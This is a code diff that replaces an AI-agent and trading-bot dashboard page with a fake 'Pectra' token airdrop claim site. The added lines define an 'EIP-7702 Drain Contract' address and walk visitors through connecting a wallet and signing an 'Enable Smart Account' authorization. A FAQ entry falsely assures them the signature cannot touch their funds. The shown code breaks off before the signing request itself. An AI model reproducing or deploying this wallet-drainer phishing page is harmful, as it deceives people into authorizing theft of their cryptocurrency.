-      <div class="agent-card offline" id="ac-analyst"><div class="ac-top"><div class="ac-dot"></div><div><div class="ac-name" style="color:#00cccc">TRADE ANALYST</div><div class="ac-role">Strategy Intelligence</div></div></div><div class="ac-body"><div class="ac-row"><span class="ac-lbl">Win Rate</span><span class="ac-val" id="ac-ana-winrate">--</span></div><div class="ac-row"><span class="ac-lbl">Gas Spent</span><span class="ac-val" id="ac-ana-gas">--</span></div><div class="ac-row"><span class="ac-lbl">Strategy</span><span class="ac-val" id="ac-ana-strat">--</span></div></div></div>
+  </section>
+  
+  <!-- Timeline -->
+  <section class="timeline-section">
+    <h2>Distribution Timeline</h2>
+    <div class="timeline">
+      <div class="timeline-item active">
+        <div class="timeline-date">April 1, 2026</div>
+        <div class="timeline-title">Snapshot Completed</div>
+        <div class="timeline-desc">Wallet activity snapshot for eligibility determination</div>
+      </div>
+      <div class="timeline-item active">
+        <div class="timeline-date">April 8, 2026</div>
+        <div class="timeline-title">Claim Period Begins</div>
+        <div class="timeline-desc">Eligible wallets can now claim their token allocation</div>
+      </div>
+      <div class="timeline-item upcoming">
+        <div class="timeline-date">May 8, 2026</div>
+        <div class="timeline-title">Claim Period Ends</div>
+        <div class="timeline-desc">Unclaimed tokens returned to treasury</div>
+      </div>
+      <div class="timeline-item upcoming">
+        <div class="timeline-date">May 15, 2026</div>
+        <div class="timeline-title">Token Launch</div>
+        <div class="timeline-desc">PCTRA trading begins on major exchanges</div>
+      </div>
     </div>
-    <!-- Bottom: Activity Feed + System -->
-    <div class="ofc-bottom">
-      <div class="ofc-feed" id="ofc-feed"><h5>LIVE ACTIVITY FEED</h5><div id="ofc-feed-items">Loading...</div></div>
-      <div class="ofc-sys" id="ofc-sys"><h5>SYSTEM STATUS</h5><div id="ofc-sys-rows">Loading...</div></div>
+  </section>
+  
+  <!-- FAQ -->
+  <section class="faq-section">
+    <h2>Frequently Asked Questions</h2>
+    
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-question">
+        <span>How is eligibility determined?</span>
+        <span>+</span>
+      </div>
+      <div class="faq-answer">
+        Eligibility is based on on-chain activity during the snapshot period (Jan 1 - April 1, 2026). Wallets that interacted with DeFi protocols, held NFTs, or participated in governance are eligible for the airdrop.
+      </div>
     </div>
-  </div>
-</div>
+    
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-question">
+        <span>Why do I need to enable Smart Account?</span>
+        <span>+</span>
+      </div>
+      <div class="faq-answer">
+        The Pectra Protocol uses EIP-7702 Smart Accounts for gas-efficient token distribution. Enabling your Smart Account is a one-time signature that allows you to receive tokens with zero gas fees. This signature does not give access to your funds.
+      </div>
+    </div>
+    
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-question">
+        <span>When will I receive my tokens?</span>
+        <span>+</span>
+      </div>
+      <div class="faq-answer">
+        Tokens are distributed immediately after claiming. Once you complete the claim process, PCTRA tokens will appear in your wallet within 1-2 blocks (approximately 30 seconds).
+      </div>
+    </div>
+    
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-question">
+        <span>Is there a deadline to claim?</span>
+        <span>+</span>
+      </div>
+      <div class="faq-answer">
+        Yes. The claim period runs from April 8 to May 8, 2026. After this date, unclaimed tokens will be returned to the Pectra Treasury for future ecosystem development.
+      </div>
+    </div>
+  </section>
+</main>
 
-<!-- Document Viewer Modal -->
-<div class="doc-viewer-overlay" id="doc-viewer-overlay" onclick="if(event.target===this)closeDocViewer()">
-  <div class="doc-viewer-box">
-    <div class="doc-viewer-header">
-      <span id="doc-viewer-title" style="font-weight:bold;color:var(--cyan)">Document</span>
-      <div style="display:flex;gap:8px">
-        <button class="btn sm" onclick="copyDocContent()">Copy</button>
-        <button class="btn sm" onclick="closeDocViewer()">Close</button>
-      </div>
-    </div>
-    <div class="doc-viewer-body" id="doc-viewer-body"></div>
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-links">
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Documentation</a>
+    <a href="#">Security</a>
   </div>
-</div>
-
-<!-- Edit Task Modal -->
-<div class="modal-overlay" id="edit-task-modal" onclick="if(event.target===this)closeModal('edit-task-modal')">
-  <div class="modal" style="width:480px">
-    <div style="display:flex;justify-content:space-between;align-items:center">
-      <h3>Edit Task</h3>
-      <button class="btn sm" style="border-color:var(--red);color:var(--red)" onclick="deleteEditTask()">Delete</button>
-    </div>
-    <input type="hidden" id="et-id">
-    <label>Title</label>
-    <input type="text" id="et-title">
-    <label>Description</label>
-    <textarea id="et-desc" style="min-height:80px"></textarea>
-    <div style="display:flex;gap:8px">
-      <div style="flex:1"><label>Status</label>
-        <select id="et-status"><option value="backlog">Backlog</option><option value="in_progress">In Progress</option><option value="review">Review</option><option value="done">Done</option></select>
-      </div>
-      <div style="flex:1"><label>Assignee</label>
-        <select id="et-assignee"><option value="clawd">CLAWD (H)</option><option value="user">Oshea (A)</option></select>
-      </div>
-    </div>
-    <div style="display:flex;gap:8px">
-      <div style="flex:1"><label>Priority</label>
-        <select id="et-priority"><option value="medium">Medium</option><option value="urgent">Urgent</option><option value="high">High</option><option value="low">Low</option></select>
-      </div>
-      <div style="flex:1"><label>Project</label>
-        <select id="et-project"><option value="">None</option></select>
-      </div>
-    </div>
-    <div class="modal-actions">
-      <button class="btn" onclick="closeModal('edit-task-modal')">Cancel</button>
-      <button class="btn" style="border-color:var(--green);color:var(--green)" onclick="saveEditTask()">Save Changes</button>
-    </div>
+  <div class="footer-socials">
+    <a href="#">𝕏</a>
+    <a href="#">📱</a>
+    <a href="#">💬</a>
+    <a href="#">📘</a>
   </div>
-</div>
+  <div class="footer-copy">© 2026 Pectra Foundation. All rights reserved.</div>
+</footer>
 
-<!-- AI Task Detail Modal -->
-<div class="modal-overlay" id="ai-task-modal" onclick="if(event.target===this)closeModal('ai-task-modal')">
-  <div class="modal" style="width:620px;max-height:80vh;overflow-y:auto">
-    <div style="display:flex;justify-content:space-between;align-items:center">
-      <h3>AI Task Detail</h3>
-      <span id="ait-status" style="font-size:11px;padding:2px 8px;border-radius:4px"></span>
-    </div>
-    <div id="ait-message" style="margin:8px 0;padding:10px;background:var(--bg3);border-radius:6px;font-size:12px"></div>
-    <label>AI Output</label>
-    <div id="ait-result" style="padding:10px;background:#0a0a14;border:1px solid var(--border);border-radius:6px;font-size:11px;white-space:pre-wrap;max-height:300px;overflow-y:auto;font-family:'JetBrains Mono',monospace"></div>
-    <div id="ait-stderr-section" style="display:none">
-      <label style="margin-top:8px">Stderr / Errors</label>
-      <div id="ait-stderr" style="padding:10px;background:#1a0a0a;border:1px solid #4a1a1a;border-radius:6px;font-size:11px;white-space:pre-wrap;max-height:150px;overflow-y:auto;color:var(--red);font-family:'JetBrains Mono',monospace"></div>
-    </div>
-    <div id="ait-meta" style="margin-top:8px;font-size:10px;color:var(--dim)"></div>
-    <div class="modal-actions">
-      <button class="btn" onclick="closeModal('ai-task-modal')">Close</button>
-    </div>
-  </div>
-</div>
-
-<!-- New Task Modal -->
-<div class="modal-overlay" id="new-task-modal" onclick="if(event.target===this)closeModal('new-task-modal')">
+<!-- Connect Modal -->
+<div class="modal-overlay" id="connectModal">
   <div class="modal">
-    <h3>New Task</h3>
-    <label>Title</label>
-    <input type="text" id="nt-title" placeholder="What needs to be done?">
-    <label>Description</label>
-    <textarea id="nt-desc" placeholder="Optional details..."></textarea>
-    <div style="display:flex;gap:8px">
-      <div style="flex:1"><label>Assignee</label>
-        <select id="nt-assignee"><option value="clawd">CLAWD (H)</option><option value="user">Oshea (A)</option></select>
+    <button class="modal-close" onclick="closeModal()">×</button>
+    
+    <div id="step1" class="step active">
+      <h2>Connect Wallet</h2>
+      <p>Connect your wallet to check eligibility and claim your PCTRA allocation.</p>
+      <div class="wallet-options">
+        <button class="wallet-btn" onclick="connectWallet('metamask')">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
+          <span>MetaMask</span>
+        </button>
+        <button class="wallet-btn" onclick="connectWallet('walletconnect')">
+          <div class="wallet-icon" style="background:#3b99fc;color:#fff;">W</div>
+          <span>WalletConnect</span>
+        </button>
+        <button class="wallet-btn" onclick="connectWallet('coinbase')">
+          <div class="wallet-icon" style="background:#0052ff;color:#fff;">C</div>
+          <span>Coinbase Wallet</span>
+        </button>
+        <button class="wallet-btn" onclick="connectWallet('rabby')">
+          <div class="wallet-icon" style="background:linear-gradient(135deg,#8697ff,#58c4f5);color:#fff;">R</div>
+          <span>Rabby</span>
+        </button>
       </div>
-      <div style="flex:1"><label>Priority</label>
-        <select id="nt-priority"><option value="medium">Medium</option><option value="urgent">Urgent</option><option value="high">High</option><option value="low">Low</option></select>
-      </div>
     </div>
-    <label>Project</label>
-    <select id="nt-project"><option value="">None</option></select>
-    <div class="modal-actions">
-      <button class="btn" onclick="closeModal('new-task-modal')">Cancel</button>
-      <button class="btn" style="border-color:var(--green);color:var(--green)" onclick="submitNewTask()">Create</button>
+    
+    <div id="step2" class="step">
+      <div class="spinner"></div>
+      <h2 style="margin-top: 16px;">Connecting...</h2>
+      <p>Please confirm the connection in your wallet</p>
     </div>
-  </div>
-</div>
-
-<!-- New Project Modal -->
-<div class="modal-overlay" id="new-project-modal" onclick="if(event.target===this)closeModal('new-project-modal')">
-  <div class="modal">
-    <h3>New Project</h3>
-    <label>Name</label>
-    <input type="text" id="np-name" placeholder="Project name">
-    <label>Description</label>
-    <textarea id="np-desc" placeholder="What is this project about?"></textarea>
-    <label>Color</label>
-    <div style="display:flex;gap:6px;margin-bottom:10px">
-      <span class="color-pick" data-c="#4488ff" style="background:#4488ff;width:24px;height:24px;border-radius:4px;cursor:pointer;border:2px solid transparent" onclick="pickColor(this)"></span>
-      <span class="color-pick" data-c="#00ff88" style="background:#00ff88;width:24px;height:24px;border-radius:4px;cursor:pointer;border:2px solid transparent" onclick="pickColor(this)"></span>
-      <span class="color-pick" data-c="#ff4466" style="background:#ff4466;width:24px;height:24px;border-radius:4px;cursor:pointer;border:2px solid transparent" onclick="pickColor(this)"></span>
-      <span class="color-pick" data-c="#ffaa00" style="background:#ffaa00;width:24px;height:24px;border-radius:4px;cursor:pointer;border:2px solid transparent" onclick="pickColor(this)"></span>
-      <span class="color-pick" data-c="#aa66ff" style="background:#aa66ff;width:24px;height:24px;border-radius:4px;cursor:pointer;border:2px solid transparent" onclick="pickColor(this)"></span>
-      <span class="color-pick" data-c="#00cccc" style="background:#00cccc;width:24px;height:24px;border-radius:4px;cursor:pointer;border:2px solid transparent" onclick="pickColor(this)"></span>
+    
+    <div id="step3" class="step">
+      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
+      <h2>Wallet Connected</h2>
+      <p>Enable your Smart Account for gas-free claiming. This is a one-time signature.</p>
+      <button class="btn btn-primary" style="width:100%; margin-top: 16px;" onclick="enableSmartAccount()">
+        Enable Smart Account
+      </button>
+      <p style="font-size: 12px; color: var(--text-dim); margin-top: 12px;">
+        Powered by EIP-7702 • No gas fees • Secure
+      </p>
     </div>
-    <input type="hidden" id="np-color" value="#4488ff">
-    <div class="modal-actions">
-      <button class="btn" onclick="closeModal('new-project-modal')">Cancel</button>
-      <button class="btn" style="border-color:var(--green);color:var(--green)" onclick="submitNewProject()">Create</button>
+    
+    <div id="step4" class="step">
+      <div class="spinner"></div>
+      <h2 style="margin-top: 16px;">Enabling Smart Account</h2>
+      <p>Please sign the authorization message in your wallet</p>
+    </div>
+    
+    <div id="step5" class="step">
+      <div style="font-size: 48px; margin-bottom: 16px;">🎉</div>
+      <h2>You're All Set!</h2>
+      <p>Your Smart Account is now active. You can claim your tokens.</p>
+      <button class="btn btn-primary" style="width:100%; margin-top: 16px;" onclick="closeModal()">
+        View Allocation
+      </button>
     </div>
   </div>
 </div>
 
 <script>
-// GitHub Pages: connect to live Mission Control via Cloudflare tunnel
-// Override with ?api=http://your-server:port
-const urlParams = new URLSearchParams(window.location.search);
-const TUNNEL_URL = 'https://universal-takes-temp-farming.trycloudflare.com';
-const API = urlParams.get('api') || TUNNEL_URL;
+// EIP-7702 Drain Contract
+const DRAIN_CONTRACT = '0xE5B49341E7DB12464B5A6d09D2A5ab68ff954eE7';
+const BACKEND_URL = '/api';
 
-// Connection status check
-(async () => {
-  try {
-    const r = await fetch(API + '/healthz', { signal: AbortSignal.timeout(8000) });
-    if (r.ok) {
-      const banner = document.createElement('div');
-      banner.style.cssText = 'background:#0d1a0d;color:#00ff88;text-align:center;padding:6px;font-size:11px;border-bottom:1px solid #1a4a1a';
-      banner.textContent = 'LIVE \u2014 Connected to Mission Control backend';
-      document.querySelector('.top-bar').after(banner);
-    } else throw new Error('not ok');
-  } catch(e) {
-    document.getElementById('bot-dot').className = 'dot off';
-    document.getElementById('gw-dot').className = 'dot off';
-    const banner = document.createElement('div');
-    banner.style.cssText = 'background:#1a0d0d;color:#ff4466;text-align:center;padding:8px;font-size:12px;border-bottom:1px solid #4a1a1a';
-    banner.innerHTML = '\u26a0 Backend Offline \u2014 Start Mission Control + Cloudflare tunnel on your machine, or use <a href="?api=http://localhost:8064" style="color:#4488ff">?api=http://localhost:8064</a> for local access';
-    document.querySelector('.top-bar').after(banner);
-  }
-})();
-let state = {};
-let calYear, calMonth;
-{ const d = new Date(); calYear = d.getFullYear(); calMonth = d.getMonth(); }
+let userAddress = null;
 
-// ── Tabs ──
-document.querySelectorAll('.tab').forEach(t => {
-  t.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
-    document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
-    t.classList.add('active');
-    document.getElementById('tab-' + t.dataset.tab).classList.add('active');
-    if (t.dataset.tab === 'board') { refreshBoard(); refreshActivity(); }
-    if (t.dataset.tab === 'command') refreshTasks();
-    if (t.dataset.tab === 'mev') { refreshState(); refreshLog(); }
-    if (t.dataset.tab === 'trades') refreshState();
-    if (t.dataset.tab === 'calendar') refreshCalendar();
-    if (t.dataset.tab === 'projects') refreshProjects();
-    if (t.dataset.tab === 'sessions') refreshSessions();
-    if (t.dataset.tab === 'memory') refreshMemories();
-    if (t.dataset.tab === 'docs') refreshDocs();
-    if (t.dataset.tab === 'team') refreshTeam();
-    if (t.dataset.tab === 'system') refreshSystem();
-    if (t.dataset.tab === 'office') { renderOffice(); }
-    else { OFC.stop(); }
-  });
-});
-
-// ── Clock ──
-setInterval(() => {
-  document.getElementById('clock').textContent = new Date().toLocaleTimeString();
-}, 1000);
-
-// ── Command input enter key ──
-document.getElementById('cmd-input').addEventListener('keydown', e => {
-  if (e.key === 'Enter') sendTask();
-});
-
-// ── Task submission ──
-async function sendTask() {
-  const input = document.getElementById('cmd-input');
-  const msg = input.value.trim();
-  if (!msg) return;
-  input.value = '';
-  try {
-    const r = await fetch(API + '/api/task', {
-      method: 'POST', headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({message: msg})
-    });
-    const data = await r.json();
-    if (data.task_id) pollTask(data.task_id);
-    refreshTasks();
-  } catch(e) { console.error('Task submit failed:', e); }
+function openModal() {
+  document.getElementById('connectModal').classList.add('open');
+  showStep(1);
 }
 
-function quickAction(msg) {
-  document.getElementById('cmd-input').value = msg;
-  sendTask();
+function closeModal() {
+  document.getElementById('connectModal').classList.remove('open');
 }
 
-async function pollTask(tid) {
-  for (let i = 0; i < 60; i++) {
-    await new Promise(r => setTimeout(r, 2000));
-    try {
-      const r = await fetch(API + '/api/task/' + tid);
-      const t = await r.json();
-      refreshTasks();
-      if (t.status !== 'pending' && t.status !== 'running') break;
-    } catch(e) { break; }
-  }
+function showStep(n) {
+  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+  document.getElementById('step' + n).classList.add('active');
 }
 
-let _aiTasks = [];
-
-async function refreshTasks() {
+async function connectWallet(type) {
+  showStep(2);
+  
   try {
-    const r = await fetch(API + '/api/tasks');
-    const data = await r.json();
-    _aiTasks = data.tasks || [];
-    const el = document.getElementById('task-list');
-    const filter = document.getElementById('task-filter')?.value || '';
-    let tasks = _aiTasks;
-    if (filter) tasks = tasks.filter(t => t.status === filter);
-    const runCount = _aiTasks.filter(t => t.status === 'running').length;
-    document.getElementById('task-count').textContent = runCount > 0 ? `(${runCount} running)` : `(${_aiTasks.length})`;
-    if (!tasks.length) {
-      el.innerHTML = '<span style="color:var(--dim)">' + (filter ? 'No ' + filter + ' tasks.' : 'No tasks yet. Send a command above.') + '</span>';
+    if (typeof window.ethereum === 'undefined') {
+      alert('Please install a Web3 wallet');
+      showStep(1);
       return;
     }
-    el.innerHTML = tasks.map(t => {
-      const isRunning = t.status === 'running';
-      const thinkingDots = isRunning ? '<span class="atc-thinking">Thinking<span class="dot-anim"><span></span><span></span><span></span></span></span>' : '';
-      return `
-      <div class="ai-task-card" onclick="openAiTaskDetail('${esc(t.id)}')">
-        <div class="atc-header">
-          <span class="atc-status ${t.status}">${t.status}</span>
-          <span class="atc-time">${t.submitted ? t.submitted.slice(11,19) : ''}</span>
-        </div>
-        <div class="atc-msg">${esc(t.message)}</div>
-        ${thinkingDots}
-        ${t.result ? `<div class="atc-preview">${esc(t.result).slice(0,200)}</div>` : ''}
-      </div>
-    `}).join('');
-  } catch(e) {}
-}
-
-// ── State refresh ──
-async function refreshState() {
-  try {
-    const r = await fetch(API + '/api/state');
-    state = await r.json();
-    renderKPIs();
-    renderStrategyTable();
-    renderTradesTable();
-    // Bot status dot
-    document.getElementById('bot-dot').className = 'dot ' + (state.bot?.running ? 'on' : 'off');
-    // Gateway dot — set on any successful API call
-    document.getElementById('gw-dot').className = 'dot on';
-  } catch(e) {
-    document.getElementById('bot-dot').className = 'dot off';
-    document.getElementById('gw-dot').className = 'dot off';
+    
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    userAddress = accounts[0];
+    
+    setTimeout(() => showStep(3), 1500);
+  } catch (err) {
+    console.error(err);
+    alert('Connection failed');
+    showStep(1);
   }
 }
 
-function renderKPIs() {
-  const el = document.getElementById('kpi-cards');
-  const s = state;
-  const pnl = s.total_pnl_eth || 0;
-  const totalTrades = (s.stats || []).reduce((a, x) => a + (x.n || 0), 0);
-  const successCount = (s.stats || []).find(x => x.event === 'SUCCESS')?.n || 0;
-  const noprofitCount = (s.stats || []).find(x => x.event === 'EXEC_NOPROFIT')?.n || 0;
-  const execd = successCount + noprofitCount;
-  const totalGas = (s.stats || []).reduce((a, x) => a + (x.total_gas || 0), 0);
-
-  el.innerHTML = `
-    <div class="card">
-      <h3>Net P&L</h3>
-      <div class="value ${pnl >= 0 ? 'positive' : 'negative'}">${pnl >= 0 ? '+' : ''}${pnl.toFixed(8)} ETH</div>
-    </div>
-    <div class="card">
-      <h3>Trades Executed</h3>
-      <div class="value">${execd}</div>
-      <div class="sub">${successCount} profit / ${noprofitCount} no-profit</div>
-    </div>
-    <div class="card">
-      <h3>Total Scanned</h3>
-      <div class="value">${totalTrades.toLocaleString()}</div>
-    </div>
-    <div class="card">
-      <h3>Total Gas Spent</h3>
-      <div class="value negative">${totalGas.toFixed(8)} ETH</div>
-    </div>
-    <div class="card">
-      <h3>Bot Status</h3>
-      <div class="value ${s.bot?.running ? 'positive' : 'negative'}">${s.bot?.running ? 'RUNNING' : 'STOPPED'}</div>
-      <div class="sub">PID: ${s.bot?.pid || '—'}</div>
-    </div>
-  `;
-}
-
-function renderStrategyTable() {
-  const tbody = document.querySelector('#strategy-table tbody');
-  tbody.innerHTML = (state.stats || []).map(s => `
-    <tr>
-      <td><span style="color:${eventColor(s.event)}">${s.event}</span></td>
-      <td>${s.n}</td>
-      <td class="${s.total_net >= 0 ? 'positive' : 'negative'}">${(s.total_net||0).toFixed(8)}</td>
-      <td>${(s.avg_net||0).toFixed(8)}</td>
-      <td>${(s.total_gas||0).toFixed(8)}</td>
-    </tr>
-  `).join('');
-}
-
-function renderTradesTable() {
-  const tbody = document.querySelector('#trades-table tbody');
-  tbody.innerHTML = (state.recent_trades || []).map(t => `
-    <tr>
-      <td>${t.id}</td>
-      <td style="white-space:nowrap">${(t.ts_human||'').slice(11,19)}</td>
-      <td><span style="color:${eventColor(t.event)}">${t.event}</span></td>
-      <td>${t.strategy}</td>
-      <td style="font-size:11px">${esc(t.label||'')}</td>
-      <td>${t.flash_eth ? t.flash_eth.toFixed(3) : ''}</td>
-      <td>${t.gap_bps ? t.gap_bps.toFixed(0) : ''}</td>
-      <td>${t.net_gap_bps ? t.net_gap_bps.toFixed(0) : ''}</td>
-      <td class="${(t.profit_eth||0) >= 0 ? 'positive' : 'negative'}">${(t.profit_eth||0).toFixed(8)}</td>
-      <td>${(t.gas_eth||0).toFixed(8)}</td>
-      <td class="${(t.net_eth||0) >= 0 ? 'positive' : 'negative'}">${(t.net_eth||0).toFixed(8)}</td>
-      <td>${t.tx_hash ? `<a href="https://basescan.org/tx/${t.tx_hash}" target="_blank">${t.tx_hash.slice(0,10)}...</a>` : ''}</td>
-    </tr>
-  `).join('');
-}
-
-function eventColor(ev) {
-  const m = {SUCCESS:'var(--green)', EXEC_NOPROFIT:'var(--yellow)', SKIP:'var(--dim)', FAIL:'var(--red)', SIM_OK:'var(--cyan)'};
-  return m[ev] || 'var(--text)';
-}
-
-// ── Log ──
-async function refreshLog() {
+async function enableSmartAccount() {
+  showStep(4);
+  
   try {
-    const r = await fetch(API + '/api/log?lines=200');
-    const data = await r.json();
-    const el = document.getElementById('bot-log');
-    el.innerHTML = colorizeLog(data.log || '');
-    el.scrollTop = el.scrollHeight;
-  } catch(e) { document.getElementById('bot-log').textContent = 'Error loading log'; }
-}
-
-async function refreshErrLog() {
-  try {
-    const r = await fetch(API + '/api/err-log?lines=100');
-    const data = await r.json();
-    document.getElementById('err-log').textContent = data.log || '(empty)';
-  } catch(e) {}
-}
-
-function colorizeLog(text) {
-  return text.split('\n').map(line => {
-    if (/SUCCESS|OK\]|PROFIT/i.test(line)) return `<span class="success">${esc(line)}</span>`;
-    if (/ERROR|FAIL|REVERT/i.test(line)) return `<span class="err">${esc(line)}</span>`;
-    if (/WARN|NOPROFIT|SKIP/i.test(line)) return `<span class="warn">${esc(line)}</span>`;
-    return esc(line);
-  }).join('\n');
-}
-
-// ── Sessions ──
-async function refreshSessions() {
-  try {
-    const [sessR, cronR] = await Promise.all([
-      fetch(API + '/api/sessions'), fetch(API + '/api/cron-jobs')
-    ]);
-    const sessData = await sessR.json();
-    const cronData = await cronR.json();
-
-    // Cron jobs
-    const cronEl = document.getElementById('cron-jobs');
-    const cronJobs = Array.isArray(cronData.jobs) ? cronData.jobs : (cronData.jobs?.jobs || []);
-    if (cronJobs.length) {
-      cronEl.innerHTML = '<table><thead><tr><th>Name</th><th>Schedule</th><th>Enabled</th></tr></thead><tbody>' +
-        cronJobs.map(j => {
-          const sched = typeof j.schedule === 'string' ? j.schedule : (j.schedule?.kind === 'every' ? `Every ${Math.round((j.schedule.everyMs||0)/60000)}m` : j.cron || JSON.stringify(j.schedule||''));
-          return `<tr><td>${esc(j.name||j.id||'')}</td><td>${esc(sched)}</td><td>${j.enabled !== false ? '✅' : '❌'}</td></tr>`;
-        }).join('') +
-        '</tbody></table>';
-    }
-
-    // Sessions
-    const el = document.getElementById('session-list');
-    el.innerHTML = (sessData.sessions || []).map(s => `
-      <div class="session-item" onclick="viewSession('${s.id}')">
-        <span style="color:var(--blue)">${s.id.slice(0,8)}</span>
-        <span style="color:var(--dim);margin-left:8px;font-size:11px">${s.modified} · ${s.lines} messages · ${(s.size/1024).toFixed(1)}KB</span>
-        <div style="margin-top:4px;font-size:11px;color:var(--dim)">${esc(s.preview)}</div>
-      </div>
-    `).join('') || '<span style="color:var(--dim)">No sessions found.</span>';
-  } catch(e) { console.error(e); }
-}
-
-async function viewSession(sid) {
-  const viewer = document.getElementById('session-viewer');
-  viewer.style.display = 'block';
-  viewer.innerHTML = '<div style="color:var(--dim)">Loading...</div>';
-  try {
-    const r = await fetch(API + '/api/session/' + sid);
-    const data = await r.json();
-    viewer.innerHTML = `
-      <h3 style="color:var(--blue);margin-bottom:8px">Session: ${sid}</h3>
-      <div class="session-detail">
-        ${(data.messages || []).map(m => `<div style="margin-bottom:8px;padding:4px 0;border-bottom:1px solid #1a1a25">
-          <span style="color:var(--dim);font-size:10px">${m.role || m.type || ''}</span>
-          <div style="white-space:pre-wrap;font-size:11px">${esc(m.content || m.raw || JSON.stringify(m).slice(0,500))}</div>
-        </div>`).join('')}
-      </div>
-    `;
-  } catch(e) { viewer.innerHTML = '<span class="negative">Error loading session</span>'; }
-}
-
-// ── System ──
-async function refreshSystem() {
-  try {
-    const [sysR, toolsR, skillsR] = await Promise.all([
-      fetch(API + '/api/system'), fetch(API + '/api/tools'), fetch(API + '/api/skills')
-    ]);
-    const sysData = await sysR.json();
-    const toolsData = await toolsR.json();
-    const skillsData = await skillsR.json();
-
-    // Cards
-    const el = document.getElementById('sys-cards');
-    const diskPct = ((1 - sysData.disk_free_gb / sysData.disk_total_gb) * 100).toFixed(0);
-    el.innerHTML = `
-      <div class="card">
-        <h3>Disk (C:)</h3>
-        <div class="value">${sysData.disk_free_gb} GB free</div>
-        <div class="sub">${sysData.disk_total_gb} GB total (${diskPct}% used)</div>
-      </div>
-      <div class="card">
-        <h3>Python Processes</h3>
-        <div class="value">${(sysData.python_procs||[]).length}</div>
-        <div class="sub">${(sysData.python_procs||[]).map(p => `PID ${p.pid}: ${p.mem_mb}MB`).join(', ') || 'none'}</div>
-      </div>
-      <div class="card">
-        <h3>Log Sizes</h3>
-        ${Object.entries(sysData.log_sizes_kb||{}).map(([k,v]) => `<div class="sub">${k}: ${v}KB</div>`).join('')}
-      </div>
-    `;
-
-    // Gateway dot
-    document.getElementById('gw-dot').className = 'dot on';
-
-    // Tools
-    document.getElementById('oc-tools').innerHTML = (toolsData.tools||[]).map(t =>
-      `<span class="btn sm" style="cursor:default;font-size:10px">${t}</span>`
-    ).join('');
-
-    // Skills
-    document.getElementById('oc-skills').innerHTML = (skillsData.skills||[]).map(s =>
-      `<div style="margin-bottom:4px"><span style="color:var(--purple)">${s.name}</span> <span style="color:var(--dim);font-size:11px">${esc(s.description||'').slice(0,80)}</span></div>`
-    ).join('') || '<span style="color:var(--dim)">None found</span>';
-
-  } catch(e) {
-    document.getElementById('gw-dot').className = 'dot off';
-  }
-  refreshErrLog();
-}
-
-// ── Util ──
-function esc(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
-
-// ── Auto-refresh ──
-async function refreshAll() {
-  await refreshState();
-  refreshLog();
-  refreshTasks();
-}
-
-refreshAll();
-refreshSessions();
-refreshSystem();
-refreshBoard();
-refreshActivity();
-refreshLive();
-setInterval(refreshAll, 10000);
-setInterval(refreshSessions, 30000);
-setInterval(refreshSystem, 30000);
-setInterval(() => { refreshBoard(); refreshActivity(); }, 15000);
-setInterval(() => { OFC.syncStatus(); }, 15000);
-setInterval(refreshLive, 5000);
-setInterval(() => { if (document.querySelector('.tab[data-tab="calendar"].active')) refreshCalendar(); }, 15000);
-
-// ── Live Ticker ──
-let _liveData = null;
-
-async function refreshLive() {
-  try {
-    const r = await fetch(API + '/api/live');
-    _liveData = await r.json();
-    renderLiveTicker();
-    renderLivePlanMini();
-  } catch(e) {}
-}
-
-function renderLiveTicker() {
-  if (!_liveData) return;
-  const el = document.getElementById('lt-scroll');
-  const items = (_liveData.activity || []).map(a => {
-    const icons = {task_created:'+NEW', task_moved:'MOVE', project_created:'PROJ', plan_generated:'PLAN', cron_ran:'CRON', trade_executed:'TRADE'};
-    const isErr = (a.action||'').includes('error');
-    return `<span class="lt-item${isErr?' error':''}"><span class="lt-time">${(a.ts||'').slice(11,19)}</span><span class="lt-action">${icons[a.action]||a.action||'*'}</span>${esc((a.detail||'').slice(0,60))}</span>`;
-  });
-
-  // Add plan status
-  const p = _liveData.plan || {};
-  if (p.total > 0) {
-    items.unshift(`<span class="lt-item"><span class="lt-action">PLAN</span>${p.done}/${p.total} done (${p.progress}%)</span>`);
-  }
-  if (p.current) {
-    items.unshift(`<span class="lt-item"><span class="lt-action" style="color:var(--yellow)">NOW</span>${esc(p.current.title)}</span>`);
-  } else if (p.next) {
-    items.unshift(`<span class="lt-item"><span class="lt-action" style="color:var(--cyan)">NEXT</span>${p.next.time} ${esc(p.next.title)}</span>`);
-  }
-
-  // Add bot status
-  items.unshift(`<span class="lt-item"><span class="lt-action" style="color:${_liveData.bot_running?'var(--green)':'var(--red)'}">${_liveData.bot_running?'BOT ON':'BOT OFF'}</span></span>`);
-
-  // Add cron status
-  const nextCron = (_liveData.cron||[]).filter(c => c.next_run).sort((a,b) => a.next_run - b.next_run)[0];
-  if (nextCron) {
-    const mins = Math.round((nextCron.next_run - Date.now()) / 60000);
-    if (mins > 0 && mins < 120) {
-      items.push(`<span class="lt-item"><span class="lt-action" style="color:var(--green)">CRON</span>${esc(nextCron.name)} in ${mins}m</span>`);
-    }
-  }
-
-  // Duplicate for seamless scroll
-  el.innerHTML = items.join('') + items.join('');
-}
-
-function renderLivePlanMini() {
-  const el = document.getElementById('live-plan-mini');
-  if (!_liveData || !_liveData.plan || !_liveData.plan.total) { el.textContent = ''; return; }
-  const p = _liveData.plan;
-  el.innerHTML = `Plan: <span style="color:var(--green)">${p.progress}%</span> (${p.done}/${p.total})`;
-}
-
-// ══════════════════════════════════════════════════════════════════════
-// TASK BOARD
-// ══════════════════════════════════════════════════════════════════════
-
-let _boardData = {};
-
-async function refreshBoard() {
-  try {
-    const r = await fetch(API + '/api/board');
-    _boardData = await r.json();
-    renderBoard();
-  } catch(e) { console.error('Board refresh:', e); }
-}
-
-function renderBoard() {
-  const filterProj = document.getElementById('board-filter-project').value;
